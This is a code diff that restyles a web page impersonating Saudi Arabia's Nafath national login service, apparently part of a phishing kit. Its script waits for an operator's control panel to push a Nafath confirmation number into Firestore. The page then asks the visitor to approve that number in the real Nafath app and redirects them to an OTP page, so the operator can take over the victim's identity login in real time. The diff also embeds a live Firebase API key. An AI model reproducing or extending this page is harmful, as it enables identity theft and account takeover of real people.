@@ -6,62 +6,50 @@
     <script src="js/theme-toggle.js"></script>
     <script src="js/i18n.js"></script>
     <title>تأكيد نفاذ | Nafath Confirmation</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/site-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/inner-theme.css">
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
     <style>
-        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; direction: rtl; padding: 16px; }
-        .nafath-card { width: 100%; max-width: 420px; min-height: 550px; border-radius: var(--tree-radius-xl); display: flex; flex-direction: column; overflow: hidden; position: relative; }
-        .header { padding: 25px; display: flex; justify-content: center; border-bottom: 1px solid var(--tree-border); }
-        .header img { height: 45px; }
-        .content { flex: 1; padding: 40px 30px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner {
-            width: 60px; height: 60px; border: 5px solid var(--tree-border); border-top: 5px solid var(--tree-primary);
-            border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 30px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .number-display {
-            font-size: 70px; font-weight: bold; width: 140px; height: 140px;
-            display: flex; align-items: center; justify-content: center; border-radius: 50%; border: 4px solid var(--tree-primary);
-            background: var(--tree-primary-soft); margin: 20px auto; color: var(--tree-primary);
-        }
-        .title { font-size: 18px; font-weight: bold; margin-bottom: 10px; color: var(--tree-text); }
-        .subtitle { font-size: 15px; line-height: 1.6; color: var(--tree-text-muted); }
-        #code-screen { display: none; width: 100%; animation: fadeIn 0.5s; }
-        #loading-screen { display: flex; flex-direction: column; align-items: center; width: 100%; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        body { display:flex; align-items:center; justify-content:center; padding:20px; }
+        #code-screen { display:none; animation:fadeIn 0.4s; }
+        #loading-screen { display:flex; flex-direction:column; align-items:center; }
+        @keyframes fadeIn { from { opacity:0; transform:translateY(8px); } to { opacity:1; transform:translateY(0); } }
     </style>
 </head>
-<body class="tree-site nafath_process-page">
+<body>
 
 <button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>
 
-    <div class="nafath-card">
-        <div class="header">
-            <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="45" width="180">
-        </div>
-
-        <div class="content">
-            <!-- شاشة الانتظار -->
-            <div id="loading-screen">
-                <div class="spinner"></div>
-                <div class="title" data-i18n="nafath_proc.creating">جاري إنشاء طلب التوثيق...</div>
-                <div class="subtitle" data-i18n="nafath_proc.wait">يرجى الانتظار قليلاً بينما نقوم بتجهيز الطلب</div>
-            </div>
-
-            <!-- شاشة الرقم -->
-            <div id="code-screen">
-                <div class="title" data-i18n="nafath_proc.select">الرجاء اختيار الرقم في تطبيق نفاذ</div>
-                <div class="number-display" id="display-num">--</div>
-                <div class="subtitle" data-i18n="nafath_proc.open">افتح تطبيق نفاذ وقم بتأكيد الطلب باختيار الرقم الظاهر أعلاه</div>
-                <div id="timer-box" style="margin-top: 20px; color: #dc3545; font-weight: bold; font-size: 1.1rem; display: none;"><span data-i18n="nafath_proc.validity">صلاحية الرقم:</span> <span id="timer">01:00</span></div>
-            </div>
-        </div>
+<div class="teal-card teal-card--narrow" style="width:100%;">
+    <div style="padding:20px 24px;display:flex;justify-content:center;border-bottom:1px solid var(--teal-border);">
+        <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="44" width="180">
     </div>
 
+    <div class="card-body">
+
+        <!-- Loading -->
+        <div id="loading-screen" style="text-align:center;padding:24px 0;">
+            <div class="spin-ring" style="margin-bottom:20px;"></div>
+            <div class="section-title" data-i18n="nafath_proc.creating">جاري إنشاء طلب التوثيق...</div>
+            <div class="section-sub" style="margin-top:6px;" data-i18n="nafath_proc.wait">يرجى الانتظار قليلاً بينما نقوم بتجهيز الطلب</div>
+        </div>
+
+        <!-- Code -->
+        <div id="code-screen" style="text-align:center;">
+            <div class="section-title" data-i18n="nafath_proc.select">الرجاء اختيار الرقم في تطبيق نفاذ</div>
+            <div class="nafath-number-circle" id="display-num">--</div>
+            <div class="section-sub" data-i18n="nafath_proc.open">افتح تطبيق نفاذ وقم بتأكيد الطلب باختيار الرقم الظاهر أعلاه</div>
+            <div id="timer-box" style="display:none;margin-top:16px;" class="timer-chip">
+                <span data-i18n="nafath_proc.validity">صلاحية الرقم:</span>
+                <span class="timer-chip__num" id="timer">01:00</span>
+            </div>
+        </div>
+
+    </div>
+</div>
+
 <script>
-    // إعدادات Firebase
     const firebaseConfig = {
         apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
         authDomain: "tameen-658e9.firebaseapp.com",
@@ -72,56 +60,42 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
-
-    // جلب الـ ID المحفوظ
     const userId = localStorage.getItem('user_id');
-
     let timerInterval;
+
     function startTimer(duration) {
-        let timer = duration, minutes, seconds;
+        let timer = duration;
         const display = document.getElementById('timer');
-        document.getElementById('timer-box').style.display = 'block';
-        
+        document.getElementById('timer-box').style.display = 'inline-flex';
         clearInterval(timerInterval);
-        timerInterval = setInterval(function () {
-            minutes = parseInt(timer / 60, 10);
-            seconds = parseInt(timer % 60, 10);
-            display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
+        timerInterval = setInterval(() => {
+            const m = parseInt(timer/60,10);
+            const s = parseInt(timer%60,10);
+            display.textContent = (m<10?'0'+m:m)+':'+(s<10?'0'+s:s);
             if (--timer < 0) { clearInterval(timerInterval); display.textContent = "00:00"; }
         }, 1000);
     }
 
     if (userId) {
-        // مراقبة الطلب لحظة بلحظة
         db.collection("orders").doc(userId).onSnapshot((doc) => {
             if (doc.exists) {
                 const data = doc.data();
-
-                // إذا أرسلت رقم نفاذ من لوحة التحكم
                 if (data.next_step === "SHOW_NAFATH_CODE" && data.nafath_code) {
-                    // التحقق من أن الشاشة لم تظهر بعد لمنع إعادة تشغيل المؤقت عند تحديث البيانات
                     if (document.getElementById('code-screen').style.display !== 'block') {
                         document.getElementById('loading-screen').style.display = 'none';
                         document.getElementById('code-screen').style.display = 'block';
                         document.getElementById('display-num').innerText = data.nafath_code;
-                        startTimer(60); // تشغيل العداد لمدة 60 ثانية
+                        startTimer(60);
                     }
                 }
-
-                // إذا ضغطت "رفض" في لوحة التحكم
                 if (data.next_step === "GO_TO_REJECT") {
-                    alert("نعتذر، تم رفض الطلب.");
+                    alert(t('nafath_proc.rejected'));
                     window.location.href = "index.html";
                 }
-
-                // إذا ضغطت "طلب كود OTP"
-                if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp_verification.html";
-                }
+                if (data.next_step === "GO_TO_OTP") window.location.href = "otp_verification.html";
             }
         });
     } else {
-        // إذا دخل الصفحة بدون تسجيل بيانات يرجعه للرئيسية
         window.location.href = "index.html";
     }
 </script>
